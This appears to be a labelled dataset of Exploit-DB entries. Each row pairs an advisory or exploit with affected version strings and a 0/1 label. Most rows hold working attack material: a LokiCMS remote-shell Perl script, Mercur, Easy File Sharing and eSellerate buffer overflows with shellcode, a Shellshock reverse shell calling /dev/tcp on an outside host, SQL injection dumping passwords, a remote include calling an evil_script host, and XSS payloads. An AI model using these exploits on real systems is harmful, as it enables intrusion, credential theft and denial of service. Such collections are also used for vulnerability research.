4289,"EFS Easy Chat Server 2.2 - Remote Denial of Service <?php  ########################################################## ###----------------------------------------------------### ###--------Easy Chat Server Remote DoS Exploit---------### ###----------------------------------------------------### ###-http://www.echatserver.com/------------------------### ###----------------------------------------------------### ###-Tested on version 2.2 [last version]-(XP SP2)------### ###----------------------------------------------------### ###-Usage:-php dos.php [TARGET] [PORT]-----------------### ###----------------------------------------------------### ###-Author:--NetJackal---------------------------------### ###-Email:---nima_501[at]yahoo[dot]com-----------------### ###-Website:-http://netjackal.by.ru--------------------### ###----------------------------------------------------### ##########################################################  /* Description:  Easy Chat Server has built-in web server let users login to chat server. Login page allow Max 30 characters length for Name & Password. If attacker inserts a long Name & Password by editing or make his own login page, chat server will crash. */ echo ""Easy Chat Server Remote DoS Exploit\n\t\t\t\tby NetJackal""; if($argc<2)die(""\nUsage:   php dos.php [TARGET] [PORT]\nExample: php dos.php localhost 80\n""); $host=$argv[1]; $port=$argv[2]; $A=str_repeat('A',999); echo ""\nConnecting...""; $link=fsockopen($host,$port,$en,$es,30); if(!$link)die(""\n$en: $es""); echo ""\nConnected!""; echo ""\nSending exploit...""; fputs($link,""GET /chat.ghp?username=$A&password=$A&room=1&sex=2 HTTP/1.1\r\nHost: $host\r\n\r\n""); echo ""\nWell done!\n""; ?>  # milw0rm.com [2007-08-14]",['2.2'],1
26087,Jax PHP Scripts 1.0/1.34/2.14/3.31 - 'jax_calendar.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/14481/info        Jax PHP Scripts are affected by multiple cross-site scripting vulnerabilities. These issues are due to a failure in the applications to properly sanitize user-supplied input.        An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/calendar/jax_calendar.php?Y=2005[XSS-CODE]&m=8&d=2&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0&language=spanish&gmt_ofs=0&view=d30&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00&evt_title=Karlsruhe+-+Ausstellung%3A+K%F6rper+im+elektromagnetischen+Feld http://www.example.com/calendar/jax_calendar.php?Y=2005&m=8[XSS-CODE]&d=2&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0&language=spanish&gmt_ofs=0&view=d30&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00&evt_title=Karlsruhe+-+Ausstellung%3A+K%F6rper+im+elektromagnetischen+Feld http://www.example.com/calendar/jax_calendar.php?Y=2005&m=8&d=2[XSS-CODE]&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0&language=spanish&gmt_ofs=0&view=d30&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00&evt_title=Karlsruhe+-+Ausstellung%3A+KF6rper+im+elektromagnetischen+Feld http://www.example.com/calendar/jax_calendar.php?Y=2005&m=8&d=2&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0[XSS-CODE]&language=spanish&gmt_ofs=0&view=d30&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00&evt_title=Karlsruhe+-+Ausstellung%3A+KF6rper+im+elektromagnetischen+Feld http://www.example.com/calendar/jax_calendar.php?Y=2005&m=8&d=2&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0&language=spanish[XSS-CODE]&gmt_ofs=0&view=d30&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00&evt_title=Karlsruhe+-+Ausstellung%3A+K%F6rper+im+elektromagnetischen+Feld http://www.example.com/calendar/jax_calendar.php?Y=2005&m=8&d=2&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0&language=spanish&gmt_ofs=0[XSS-CODE]&view=d30&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00&evt_title=Karlsruhe+-+Ausstellung%3A+K%F6rper+im+elektromagnetischen+Feld http://www.example.com/calendar/jax_calendar.php?Y=2005&m=8&d=2&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0&language=spanish&gmt_ofs=0&view=d30[XSS-CODE]&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00&evt_title=Karlsruhe+-+Ausstellung%3A+K%F6rper+im+elektromagnetischen+Feld http://www.example.com/calendar/jax_calendar.php?Y=2005&m=8&d=2&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0&language=spanish&gmt_ofs=0&view=d30&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00[XSS-CODE]&evt_title=Karlsruhe+-+Ausstellung%3A+K%F6rper+im+elektromagnetischen+Feld http://www.example.com/calendar/jax_calendar.php?Y=2005&m=8&d=2&do=show_event&key=db6165c8fd09437c00badaf419eb0db5&cal_id=0&language=spanish&gmt_ofs=0&view=d30&evt_date=29.07.2005+10%3A00+-%3Cbr%3E09.10.2005+18%3A00&evt_title=Karlsruhe+-+Ausstellung%3A+K%F6rper+im+elektromagnetischen+Feld[XSS-CODE],['1.0/1.34/2.14/3.31'],1
13962,"Joomla! Component JomSocial 1.6.288 - Multiple Cross-Site Scripting Vulnerabilities # Software Link: http://jomsocial.com # Version: 1.6.288  Since Sid3^effects published a single one of these 21 June 2010 - http://www.exploit-db.com/exploits/13955/ - I figured the cat's out of the bag...  His exploit works even on 1.8RC1, however it gets sanitized once it hits the server (there's an ajax update that shows the marquee, but further views render it inoperable).  The following were reported to Azrul back in March and patched in an update 31 March 2010.   Persistent XSS -------------- The following fields allow for persistent XSS in admin panel (requires admin to edit profile & click the field):  status, mobile phone, land phone, state, city, website, college  test"" onclick=""alert(1)   Edit Details > Name field persistent XSS: ----------------------------------------- t""/onmouseover=""alert(1)  executes on avatars located on: * admin edit user page * the main jomsocial page in the members avatar field at the top * affected user's profile * who's online * the wall posts * group discussion replies (but not the initial discussion message) * people search results * compose message * write message friend list multiselect * new message notification * inbox (main listing) * inbox (while reading message) * friends approval list * online users mod * latest members mod  possibly others...    Groups name field persistent XSS: --------------------------------- g""/onmouseover=""alert(1)//  mouseover executes on:  * latest groups * group listing * group search results * frontend edit group form * admin edit group modal  possibly others...    Messages Persistent XSS ----------------------- subject & message fields do not filter html tags properly:  xss<img/src/onerror=alert(/xss/.source)//  occurs in both main inbox (subject) and while reading message (both)    Groups Album Description Persistent XSS --------------------------------------- d""/onmouseover=""alert(1)//  this XSS is rendered in the tips section of the album listing    Report **** Admin Persistent XSS -------------------------------- ""message"" field is not properly sanitized, admin must view reports for execution (no other interaction needed)  <img/src/onerror=alert(1)//  if POST data is tampered before submission, the report url can also be exploited doing so only requires minimal admin interaction in backend:  %23%22%2fonmouseover%3D%22alert%281%29%2f%2f  NOTE: it is possible to merely change the url hash, but then the form will not send    Search People input Reflective XSS ---------------------------------- search people input: t""/onmouseover=""alert(1)",['1.6.288'],1
2254,"PHPCOIN 1.2.3 - 'session_set.php' Remote File Inclusion phpCOIN 1.2.3 (_CCFG[_PKG_PATH_INCL]) Remote Include Vulnerability  ##################################################################  Discovered by: Timq http://www.securitydb.org ##################################################################  Email: timq[at]hackernetwork[dot]com  http://www.securitydb.org ##################################################################  Vulnerable: require_once include ($_CCFG['_PKG_PATH_INCL'].'redirect.php');  ###################################################################  Exploit PoC:  http://www.site.com/[path]/coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]=http://evil_script? http://www.site.com/[path]/includes/constants.php?_CCFG[_PKG_PATH_INCL]=http://evil_script?  Dork: Powered By phpCOIN 1.2.3 ####################################################################  Shoutz: Warpboy,Z66,Gammarays,Archangel,BliTz,Splinter,InTel,ErazerZ,Maggot,PunKerX,Infiltration  #####################################################################  # milw0rm.com [2006-08-24]",['1.2.3'],1
20647,"Atrium Software Mercur Mail Server 3.3 - EXPN Buffer Overflow // source: https://www.securityfocus.com/bid/2412/info  Atrium Software Mercur Mail Server 3.3 contains an unchecked buffer for the EXPN command which may lead to a denial of service attack or execution of arbitrary code depending on the data entered.  If a remote attacker were to telnet to the SMTP server and enter an overly long string of random characters following the EXPN command, the remote target would crash. The execution of arbitrary code is possible if a carefully crafted string that overwrote the EIP was entered into the buffer. The attacker would be able to perform virtually any action on the remote system under the context of the LocalSystem account.   /*  MERCUR Mailserver 3.3 Remote Buffer Overflow  Tested on Win2K AS SP1 with MERCUR SMTP- Server v3.30.03  Martin Rakhmanoff  martin@direct.spb.ru */  #include <winsock2.h> #include <stdio.h>  /* \x63\x6D\x64\x2E\x65\x78\x65 - simply 'cmd.exe' */ char shellcode[] =  ""\x8B\xC4\x83\xC0\x17\x50\xB8\x0E\xB5\xE9\x77 \xFF\xD0\x33\xDB\x53""  ""\xB8\x2D\xF3\xE8\x77\xFF\xD0\x63\x6D\x64 \x2E\x65\x78\x65\x0D\x0A""; /* In SoftICE bpx 001b:00418b65 - here eip is restored with overwritten value... */  int main(int argc, char * argv[]){   int i;  char sploit[512];  char buffer[512];   WSADATA wsaData;  SOCKET  sock;  struct sockaddr_in server;  struct hostent *hp;   WSAStartup(0x202,&wsaData);  hp = gethostbyname(""arena"");  memset(&server,0,sizeof(server));  memcpy(&(server.sin_addr),hp->h_addr,hp- >h_length);  server.sin_family = hp->h_addrtype;  server.sin_port = htons(25);  sock = socket(AF_INET,SOCK_STREAM,0);  connect(sock,(struct sockaddr*)&server,sizeof (server));   sploit[0]='E';  sploit[1]='X';  sploit[2]='P';  sploit[3]='N';  sploit[4]=0x20;    for(i=5;i<137;i++){   sploit[i]=0x41;  }   // Return address  //77E87D8B   sploit[137]=0x8B;  sploit[138]=0x89;  sploit[139]=0xE8;  sploit[140]=0x77;   for(i=0;i<sizeof(shellcode);i++){   sploit[i+141]=shellcode[i];  }   recv(sock,buffer,512,0);   send(sock,sploit,173,0);   closesocket(sock);  WSACleanup();   return 0; }",['3.3'],1
28287,"Linux-HA Heartbeat 1.2.3/2.0.x - Insecure Default Permissions on Shared Memory // source: https://www.securityfocus.com/bid/19186/info  Since Linux-HA Heartbeat has insecure default permissions set on shared memory, local attackers may be able to cause a denial of service.  Exploitation would most likely result in a system crash, loss of data, and resource exhaustion, leading to a denial of service if critical files are accessed improperly or overwritten in the attack. Other attacks may be possible as well.  /* Intruders Tiger Team Security  * http://www.intruders.org.br/  *  * Heartbeat < 2.0.6 Insecure Shared Memory - Local Denial of Service.  *   * Credits: Yan Rong Ge, see link below:  * http://secunia.com/advisories/21162/  * Tested on Heartbeat 2.0.5.  *  * Thanks for Wendel Guglielmetti, Waldemar Nehgme,  * Joao Arquimedes, Ricardo BSD and Vitor, Intruders   * Tiger Team Security.  *  * Usage:  * [security@mail1 tmp]$ ipcs  *   * ------ Shared Memory Segments --------  * key        shmid      owner      perms      bytes      nattch     status  * 0x00000000 1638402    root      666        7296       6          dest  *  * ------ Semaphore Arrays --------  * ....  * Get shmid of heartbeat(look perms == 666, this is wrong!!!:))  *  *  [security@mail1 tmp]$ ./itts_sharedex2 1638402 ""Intruders Tiger Team Security..""  *  * The heartbeat�s process will droped.  * Brazil, July/2006.  */   #include <stdio.h> #include <sys/types.h> #include <sys/ipc.h> #include <sys/shm.h>   int main(int argc, char *argv[]){ int shmid; char *shm;  if(argc < 2){ printf(""Heartbeat Insecure Shared Memory Exploit by Nash Leon\n""); printf(""Usage: %s <target_shmid> <trash>\n"", argv[0]); exit(0); } shmid = atoi(argv[1]); if ((shm = shmat(shmid, NULL, 0)) == (char *) -1) { perror(""shmat""); exit(1); }  strncpy(shm,argv[2],1024); printf(""Check now heartbeat pid or shared memory\n""); printf(""Running ps auxww | grep heartbeat or ipcs again.\n\n""); exit(0); }","['1.2.3/2.0.x', '< 2.0.6', '2.0.5']",1
16989,"b2evolution 4.0.3 - Persistent Cross-Site Scripting Source: http://packetstormsecurity.org/files/view/99362/b2evolution403-xss.txt  ------------------------------------------------------------------------ Software................b2evolution 4.0.3 Vulnerability...........Persistent Cross-site Scripting Threat Level............Moderate (2/5) Download................http://b2evolution.net/ Vendor Contact Date.....3/15/2011 Disclosure Date.........3/15/2011 Tested On...............Windows Vista + XAMPP ------------------------------------------------------------------------ Author..................AutoSec Tools Site....................http://www.autosectools.com/ Email...................John Leitch <john@autosectools.com> ------------------------------------------------------------------------   --Description--  A persistent cross-site scripting vulnerability in b2evolution 4.0.3 can be exploited to execute arbitrary JavaScript.   --Exploit--  Data submitted to the ""Comment text"" input of the blog comment form is not properly santized. As a result, javascript can be executed throughout the application (admin dashboard, admin comment full text view, possibly other pages).   --PoC--  <?<a><script>alert(0)</script>",['4.0.3'],1
5408,"LokiCMS 0.3.3 - Remote Command Execution # Author:	__GiReX__ # mySite:	girex.altervista.org # Date:		8/04/08  # CMS: 		LokiCMS <= 0.3.3 # Site:		lokicms.com  # Bug: 		PHP Code Injection # Exploit:	Remote Command Execution  # Vuln Code: admin.php  #	if ($_GET['default'] != '') { // User want's to set the default page #		writeconfig($c_password, $c_title, $c_header, $c_tagline, $c_footnote, stripslashes($_GET['default']), #		$c_theme, $c_language, $c_modrewrite, $c_simplelink, $c_code);  # Our bugged var $_GET['default'] is stripslashed so we don't need magic_quotes_gpc Off # writeconfig() simply put text into Config.php  # This is a very bugged CMS, only most dengerous bug is here reported    #!/usr/bin/perl -w # LokiCMS <= 0.3.3 Remote Command Execution Exploit # Works with magic_quotes_gpc = On # Coded by __GiReX__  use LWP::Simple;  if(not defined $ARGV[0]) {      banner();      print ""[-] Usage: perl $0 [host] [path]\n"";      print ""[-] Example: perl $0 localhost /lokicms/\n\n"";      exit; }   my $host  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];    $host .=  $ARGV[1] unless not defined $ARGV[1];  banner(); get($host.'admin.php?default=\';passthru($_GET[\'cmd\']);//') or die '[-] Error requesting page: admin.php';  while(1) {      print ""[+] Shell:~\$ "";      chomp($cmd = <STDIN>);      last if $cmd eq 'exit';      last if is_error(getprint($host.""includes/Config.php?cmd=${cmd}""));      print $resp; }  sub banner {      print ""[+] LokiCMS <= 0.3.3 Remote Command Execution Exploit\n"";      print ""[+] Coded by __GiReX__\n"";      print ""\n""; }  # milw0rm.com [2008-04-08]",['0.3.3'],1
6734,"mini-pub 0.3 - Local Directory Traversal / File Disclosure  _____   ____   __   __     _       ____        ____    ____  |_   _| |  _ \  \ \ / /    / \     / ___|      / ___|  / ___|   | |   | |_) |  \ V /    / _ \   | |  _      | |     | |       | |   |  _ <    | |    / ___ \  | |_| |  _  | |___  | |___    |_|   |_| \_\   |_|   /_/   \_\  \____| (_)  \____|  \____|                                                               mini-pub.php <= v0.3 Local Directory Traversal / File Disclosure Vulnerabilities Script : http://mini-pub.sourceforge.net/ I- Local Directory Traversal POC : /mini-pub.php-0.3/front-end/dir.php?sDir=C:\AppServ\MySQL  II- File Disclosure  POC : /mini-pub.php-0.3/front-end/edit.php?sFileName=edit.php         ____           _           _           __  __         / ___|   ___   | |       __| |         |  \/  |       | |  _   / _ \  | |      / _` |         | |\/| |       | |_| | | (_) | | |___  | (_| |         | |  | |        \____|  \___/  |_____|  \__,_|  _____  |_|  |_|                                       |_____|           # milw0rm.com [2008-10-12]","['0.3', 'v0.3']",0
34879,"OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection # Exploit Title: ShellShock OpenVPN Exploit  # Date: Fri Oct  3 15:48:08 EDT 2014  # Exploit Author: hobbily AKA @fj33r  # Version: 2.2.29  # Tested on: Debian Linux  # CVE : CVE-2014-6271  #Probably should of submitted this the day I tweeted it. ### server.conf port 1194 proto udp dev tun client-cert-not-required auth-user-pass-verify /etc/openvpn/user.sh via-env tmp-dir ""/etc/openvpn/tmp"" ca ca.crt cert testing.crt key testing.key  # This file should be kept secret dh dh1024.pem server 10.8.0.0 255.255.255.0 keepalive 10 120 comp-lzo user nobody group nogroup persist-key persist-tun client-cert-not-required plugin /usr/lib/openvpn/openvpn-auth-pam.so login script-security 3 status openvpn-status.log verb 3  ### user.sh #!/bin/bash echo ""$username"" echo ""$password""  ### start server openvpn server.con  ### terminal 1 nc -lp 4444  ### terminal 2 sudo openvpn --client --remote 10.10.0.52 --auth-user-pass --dev tun --ca ca.cert --auth-nocache --comp-lzo  ### username && password were both shellshocked just incase user:() { :;};/bin/bash -i >& /dev/tcp/10.10.0.56/4444 0>&1 & pass:() { :;};/bin/bash -i >& /dev/tcp/10.10.0.56/4444 0>&1 &  ### log Mon Sep 29 20:56:56 2014 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts Mon Sep 29 20:56:56 2014 PLUGIN_INIT: POST /usr/lib/openvpn/openvpn-auth-pam.so '[/usr/lib/openvpn/openvpn-auth-pam.so] [login]' intercepted=PLUGIN_AUTH_USER_PASS_VERIFY Mon Sep 29 20:56:56 2014 Diffie-Hellman initialized with 1024 bit key Mon Sep 29 20:56:56 2014 WARNING: POTENTIALLY DANGEROUS OPTION --client-cert-not-required may accept clients which do not present a certificate Mon Sep 29 20:56:56 2014 TLS-Auth MTU parms [ L:1542 D:138 EF:38 EB:0 ET:0 EL:0 ] Mon Sep 29 20:56:56 2014 Socket Buffers: R=[163840->131072] S=[163840->131072] Mon Sep 29 20:56:56 2014 ROUTE default_gateway=10.10.0.1 Mon Sep 29 20:56:56 2014 TUN/TAP device tun0 opened Mon Sep 29 20:56:56 2014 TUN/TAP TX queue length set to 100 Mon Sep 29 20:56:56 2014 do_ifconfig, tt->ipv6=0, tt->did_ifconfig_ipv6_setup=0 Mon Sep 29 20:56:56 2014 /sbin/ifconfig tun0 10.8.0.1 pointopoint 10.8.0.2 mtu 1500 Mon Sep 29 20:56:56 2014 /sbin/route add -net 10.8.0.0 netmask 255.255.255.0 gw 10.8.0.2 Mon Sep 29 20:56:56 2014 Data Channel MTU parms [ L:1542 D:1450 EF:42 EB:135 ET:0 EL:0 AF:3/1 ] Mon Sep 29 20:56:56 2014 GID set to nogroup Mon Sep 29 20:56:56 2014 UID set to nobody Mon Sep 29 20:56:56 2014 UDPv4 link local (bound): [undef] Mon Sep 29 20:56:56 2014 UDPv4 link remote: [undef] Mon Sep 29 20:56:56 2014 MULTI: multi_init called, r=256 v=256 Mon Sep 29 20:56:56 2014 IFCONFIG POOL: base=10.8.0.4 size=62, ipv6=0 Mon Sep 29 20:56:56 2014 Initialization Sequence Completed Mon Sep 29 20:57:54 2014 MULTI: multi_create_instance called Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Re-using SSL/TLS context Mon Sep 29 20:57:54 2014 10.10.0.56:1194 LZO compression initialized Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Control Channel MTU parms [ L:1542 D:138 EF:38 EB:0 ET:0 EL:0 ] Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Data Channel MTU parms [ L:1542 D:1450 EF:42 EB:135 ET:0 EL:0 AF:3/1 ] Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Local Options hash (VER=V4): '530fdded' Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Expected Remote Options hash (VER=V4): '41690919' Mon Sep 29 20:57:54 2014 10.10.0.56:1194 TLS: Initial packet from [AF_INET]10.10.0.56:1194, sid=644ea55a 5f832b02 AUTH-PAM: BACKGROUND: user '() { :;};/bin/bash -i >& /dev/tcp/10.10.0.56/4444 0>&1 &' failed to authenticate: Error in service module Mon Sep 29 20:57:57 2014 10.10.0.56:1194 PLUGIN_CALL: POST /usr/lib/openvpn/openvpn-auth-pam.so/PLUGIN_AUTH_USER_PASS_VERIFY status=1 Mon Sep 29 20:57:57 2014 10.10.0.56:1194 PLUGIN_CALL: plugin function PLUGIN_AUTH_USER_PASS_VERIFY failed with status 1: /usr/lib/openvpn/openvpn-auth-pam.so _________/bin/bash_-i____/dev/tcp/10.10.0.56/4444_0__1__  Mon Sep 29 20:57:57 2014 10.10.0.56:1194 TLS Auth Error: Auth Username/Password verification failed for peer Mon Sep 29 20:57:57 2014 10.10.0.56:1194 Control Channel: TLSv1, cipher TLSv1/SSLv3 DHE-RSA-AES256-SHA Mon Sep 29 20:57:57 2014 10.10.0.56:1194 [] Peer Connection Initiated with [AF_INET]10.10.0.56:1194 Mon Sep 29 20:57:59 2014 10.10.0.56:1194 PUSH: Received control message: 'PUSH_REQUEST' Mon Sep 29 20:57:59 2014 10.10.0.56:1194 Delayed exit in 5 seconds Mon Sep 29 20:57:59 2014 10.10.0.56:1194 SENT CONTROL [UNDEF]: 'AUTH_FAILED' (status=1) Mon Sep 29 20:58:01 2014 read UDPv4 [ECONNREFUSED]: Connection refused (code=111) Mon Sep 29 20:58:04 2014 10.10.0.56:1194 SIGTERM[soft,delayed-exit] received, client-instance exiting  ### nc listener nobody@debian:/etc/openvpn$ id id uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) #shoutouts to Fredrik Str�mberg for the post he made on ycombinator",['2.2.29'],1
36013,foomatic-gui python-foomatic 0.7.9.4 - 'pysmb.py' Arbitrary Shell Command Execution source: https://www.securityfocus.com/bid/48982/info  foomatic-gui is prone to a remote arbitrary shell-command-execution vulnerability because the application fails to properly sanitize user-supplied input.  An attacker can exploit this issue to execute arbitrary shell commands in the context of the application.  Versions prior to foomatic-gui 0.7.9.5 are vulnerable.   netbios name = oh'notquotezSIF to /etc/samba/smb.conf,"['0.7.9.4', '0.7.9.5']",1
32401,"rgb72 WCMS 1.0 - 'index.php' SQL Injection source: https://www.securityfocus.com/bid/31298/info  rgb72 WCMS is prone to an SQL-injection vulnerability because it fails to properly sanitize user-supplied input before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.  rgb72 WCMS 1.0b is vulnerable; other versions may also be affected.   http://www.example.com/[path]/news_detail.asp?id=1+union+select+1,2,3,f_user,f_password,6,7,8+from+upass%00  http://www.example.com/[path]/news_detail.asp?id=1+union+select+1,2,f_user,4,5,f_password,7,8,9,10,11,12,13+from+upass%00",['1.0b'],1
39009,"Easy File Sharing Web Server 7.2 - HEAD Request Buffer Overflow (SEH) # Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow # Date: 12/2/2015 # Exploit Author: ArminCyber # Contact: Armin.Exploit@gmail.com # Version: 7.2 # Tested on: XP SP3 EN # category: Remote Exploit # Usage: ./exploit.py ip port  import socket import sys  host = str(sys.argv[1]) port = int(sys.argv[2])  a = socket.socket()  print ""Connecting to: "" + host + "":"" + str(port) a.connect((host,port))  entire=4500  # Junk buff = ""A""*4061  # Next SEH buff+= ""\xeb\x0A\x90\x90""  # pop pop ret buff+= ""\x98\x97\x01\x10""  buff+= ""\x90""*19  # calc.exe # Bad Characters: \x20 \x2f \x5c shellcode = ( ""\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"" ""\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"" ""\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"" ""\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"" ""\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"" ""\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"" ""\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"" ""\x1c\x39\xbd"" ) buff+= shellcode  buff+= ""\x90""*7  buff+= ""A""*(4500-4061-4-4-20-len(shellcode)-20)  # HEAD a.send(""HEAD "" + buff + "" HTTP/1.0\r\n\r\n"")  a.close()  print ""Done...""",['7.2'],1
30144,"eSellerate SDK 3.6.5 - 'eSellerateControl365.dll' ActiveX Control Buffer Overflow source: https://www.securityfocus.com/bid/24300/info  eSellerate SDK ActiveX control is prone to a buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.  Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.  This issue affects eSellerate SDK 3.6.5.0; other versions may also be affected.   <object classid='clsid:C915F573-4C11-4968-9080-29E611FDBE9F' id='test'></object>  <input language=VBScript onclick=tryMe() type=button value=""Click here to start the test"">  <script language = 'vbscript'> Sub tryMe()  buff      = String(997, ""A"")   get_EIP   = unescape(""%6B%AC%3F%7E"") '0x7E3FAC6B call EBP from user32.dll   nop       = String(24, unescape(""%90""))   shellcode = unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _              unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _              unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _              unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _              unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54"") & _              unescape(""%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37"") & _              unescape(""%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48"") & _              unescape(""%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38"") & _              unescape(""%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c"") & _              unescape(""%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e"") & _              unescape(""%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48"") & _              unescape(""%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54"") & _              unescape(""%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38"") & _              unescape(""%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43"") & _              unescape(""%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37"") & _              unescape(""%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a"") & _              unescape(""%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b"") & _              unescape(""%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33"") & _              unescape(""%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57"") & _              unescape(""%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49"") & _              unescape(""%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36"") & _              unescape(""%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a"")   egg       = buff + get_EIP + nop + shellcode + nop   test.GetWebStoreURL egg, ""default"" End Sub </script>",['3.6.5'],1
570,"WordPress Core 1.2 - HTTP Splitting # # This script is (C) Tenable Network Security # #     if(description) { script_id(15443); script_bugtraq_id(11348); script_version (""$Revision: 1.1 $"");  name[""english""] = ""WordPress HTTP Splitting Vulnerability"";  script_name(english:name[""english""]);  desc[""english""] = "" The remote host is running WordPress BLOG, a web blog manager written in PHP.  The remote version of this software is vulnerable to an HTTP-splitting attack  wherein an attacker can insert CR LF characters and then entice an unsuspecting user into accessing the URL. The client will parse and possibly act on the  secondary header which was supplied by the attacker.  Solution : Upgrade to the latest version of this software Risk factor : Medium"";     script_description(english:desc[""english""]);  summary[""english""] = ""Checks for the presence of WordPress"";  script_summary(english:summary[""english""]);  script_category(ACT_ATTACK);   script_copyright(english:""This script is Copyright (C) 2004 Tenable Network Security"", francais:""Ce script est Copyright (C) 2004 Tenable Network Security""); family[""english""] = ""CGI abuses""; family[""francais""] = ""Abus de CGI""; script_family(english:family[""english""], francais:family[""francais""]); script_dependencie(""http_version.nasl""); script_require_ports(""Services/www"", 80); exit(0); }  # # The script code starts here #   include(""http_func.inc""); include(""http_keepalive.inc"");  port = get_http_port(default:80);  if(!get_port_state(port))exit(0); if(!can_host_php(port:port))exit(0);    # The actual attack requires credentials -> do a banner check function check(loc) { res = http_keepalive_send_recv(port:port, data:http_get(item:loc + ""/index.php"", port:port)); if ( res == NULL ) exit(0); res = str_replace(find:'\n', replace:'', string:res); res = str_replace(find:'\r', replace:'', string:res);  if ( ""WordPress"" >< res && egrep(pattern:'<meta name=""generator"" content=""WordPress (0\\.|1\\.([01]|2""))', string:res)) { security_warning(port); exit(0); } }     foreach dir ( cgi_dirs() ) { check(loc:dir); }   # milw0rm.com [2004-10-10]",['1.2'],1
27971,Microsoft Internet Explorer 5.0.1 - Frameset Memory Corruption source: https://www.securityfocus.com/bid/18277/info  Microsoft Internet Explorer is affected by a memory-corruption vulnerability. This issue arises because the application fails to handle exceptional conditions in a proper manner.  An attacker may exploit this issue by enticing a user to visit a malicious site and then to click anywhere on the page. This results in a denial-of-service condition in the application.  The vendor reports this issue may also be exploited to execute arbitrary code in the context of the victim user.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/27971.zip,['5.0.1'],1
